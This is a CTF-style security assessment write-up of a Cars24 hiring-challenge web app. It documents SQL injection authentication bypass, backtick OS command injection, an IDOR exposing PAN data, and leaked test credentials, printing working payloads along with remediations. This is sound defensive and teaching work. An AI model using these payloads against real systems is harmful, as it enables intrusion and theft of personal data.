# Cars24 Security Engineering Challenge — Writeup

**Author:** Avinash Kumar Singh
Vellore Institute of Technology, Bhopal
[avinash.mar05@gmail.com](mailto:avinash.mar05@gmail.com) · [avinash.23bcy10006@vitbhopal.ac.in](mailto:avinash.23bcy10006@vitbhopal.ac.in) · +91 7498997018

**Target:** `https://security-ctf.vercel.app`
**Engagement type:** Authorized CTF-style web application assessment (Cars24 Security Engineering hiring process)
**Methodology:** Manual, targeted, black-box → authenticated testing. No brute-forcing, credential stuffing, DoS/load testing, or automated scanning, per the scope published on the target's own login page.

📄 Full formatted report: [`Cars24_Security_Assessment_Report.pdf`](./Cars24_Security_Assessment_Report.pdf)

---

## Summary of Findings

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | SQL Injection leading to Authentication Bypass | **Critical** | `/dealer-login` |
| 2 | OS Command Injection | **Critical** | `/tools/network` |
| 3 | Insecure Direct Object Reference (IDOR) exposing PII | **Critical** | `/invoices` |
| 4 | Hardcoded Credentials Disclosed in Page Source | Medium | `/login` |
| 5 | Verbose Database Error Disclosure | Medium | `/dealer-login` |
| 6 | Cleartext Password Input Field | Low | `/dealer-login` |
| 7 | Broken Access Control Enforced Correctly (positive control) | Info | `/admin` |
| 8 | Server-Side Template Injection — tested, not exploitable | Info | `/tools/notification-preview` |

---

## Access Narrative

A hardcoded test account was found embedded in an HTML comment on the public `/login` page source (Finding 4):

```html
<!--
  Default test account for onboarding (temporary -- remove before this goes to prod):
  username: cars_user
  password: cars_password
-->
```

![Login page](./screenshots/ev01_login_page.png)

Authenticating with `cars_user` / `cars_password` exposed a dashboard with a wide customer-facing + internal-tool attack surface:

![Dashboard](./screenshots/ev02_dashboard.png)

---

## Finding 1 — SQL Injection → Authentication Bypass (Critical)
**CWE-89** · `POST /dealer-login`

The Dealer Portal login builds its SQL query via raw string concatenation of user input, with no parameterization.

**Payload**
```
Username: ' OR '1'='1' --
Password: x
```

**Result:** full `dealer_users` table returned, unauthenticated, including a privileged account:

```json
{
  "id": 3,
  "username": "portal_admin",
  "dealership": "HQ",
  "is_admin": 1
}
```

![SQLi full table dump](./screenshots/ev08_sqli_bypass_fulltable.png)

**Impact:** complete auth bypass for the Dealer Portal; disclosure of every dealer account including a confirmed admin flag.

**Remediation:** parameterized queries / prepared statements, least-privilege DB accounts, WAF as defense-in-depth.

---

## Finding 2 — OS Command Injection (Critical)
**CWE-78** · `POST /tools/network`

The "host reachability check" passes user input directly into a shell. `;` and `&&` appeared filtered, but **backtick command substitution** was not.

**Payload:** `8.8.8.8\`echo CTFTEST123\`` → output: `Checking reachability of: 8.8.8.8CTFTEST123` (backticks stripped, string executed)

![Command injection confirmed](./screenshots/ev03_cmdinj_backtick.png)

Confirmed further with recon commands:

| Payload | Output |
|---|---|
| `` 8.8.8.8`id` `` | `uid=993(sbx_user1051) gid=990 groups=990` |
| `` 8.8.8.8`whoami` `` | `sbx_user1051` |

![id output](./screenshots/ev04_cmdinj_id.png)
![whoami output](./screenshots/ev05_cmdinj_whoami.png)

**Impact:** arbitrary command execution as `sbx_user1051` (uid 993). Testing was limited to read-only, non-destructive commands per engagement scope.

**Remediation:** never shell out with user input; use a language-native DNS/ICMP library, or strict allow-list validation + argv-array execution if shelling out is unavoidable.

---

## Finding 3 — IDOR Exposing PII (Critical)
**CWE-639** · `GET /invoices?id=<n>`

Invoice lookup trusts the `id` query parameter with no ownership check. Logged in as `cars_user` (own invoice IDs: 1001, 1003):

**Request:** `GET /invoices?id=1002`

```json
{
  "id": 1002,
  "ownerId": 99,
  "amount": "₹6,20,000",
  "item": "Hyundai Creta 2020",
  "pan": "PQRST9876L"
}
```

![IDOR PAN leak](./screenshots/ev06_idor_pan_leak.png)

**Impact:** any authenticated user can enumerate sequential invoice IDs to harvest other customers' PII, including government-issued PAN numbers.

**Remediation:** server-side ownership check on every object lookup; non-sequential IDs (UUIDs); avoid returning sensitive fields unless strictly necessary.

---

## Finding 4 — Hardcoded Credentials in Page Source (Medium)
**CWE-798 / CWE-540** · `GET /login`

See Access Narrative above. Removes the need for any brute-forcing — this was the entry point for the entire assessment.

**Remediation:** strip debug/test credentials before deploy; add a secret-scanning CI check.

---

## Finding 5 — Verbose Database Error Disclosure (Medium)
**CWE-209** · `POST /dealer-login`

Failed logins reflect the raw SQL query — including submitted credentials — back to the client:

```
SELECT id, username, dealership, is_admin FROM dealer_users
WHERE username = 'dealer' AND password = 'dealer123'
```

![Verbose query leak](./screenshots/ev07_sqli_query_leak.png)

**Impact:** leaks table/column names and confirms string-concatenated queries, directly enabling Finding 1.

**Remediation:** never return raw queries/stack traces to the client; log server-side only.

---

## Finding 6 — Cleartext Password Input Field (Low)
**CWE-549 (related)** · `/dealer-login`

```html
<input type="text" name="password" />
```
instead of `type="password"`. Password is rendered in plaintext as typed.

**Remediation:** change input type to `password`.

---

## Finding 7 — Access Control Correctly Enforced (Positive Control)
`GET /admin`

Despite an `/admin` link being visible in the sidebar for the low-privileged `cars_user`, direct navigation correctly returns **403 — Not authorized**. Noted as a working control, not a vulnerability. Suggest hiding the link client-side too, for defense-in-depth.

---

## Finding 8 — SSTI Tested, Not Exploitable (Info)
`POST /tools/notification-preview`

Tested `{{7*7}}` and `${7*7}` — both reflected literally rather than evaluating to `49`.

![SSTI test — not exploitable](./screenshots/ev10_ssti_test_curly.png)

**Conclusion:** not vulnerable to basic SSTI. Recorded for completeness/testing coverage.

---

## Overall Risk & Conclusion

A single exposed credential in an HTML comment was enough to pivot into full host-level command execution, a complete authentication bypass with admin-account disclosure, and unauthorized access to other customers' government ID numbers. Findings 1–3 should be treated as emergency fixes; Findings 4–6 addressed in the same remediation cycle.

All testing was manual and non-destructive, in compliance with the engagement's stated scope.
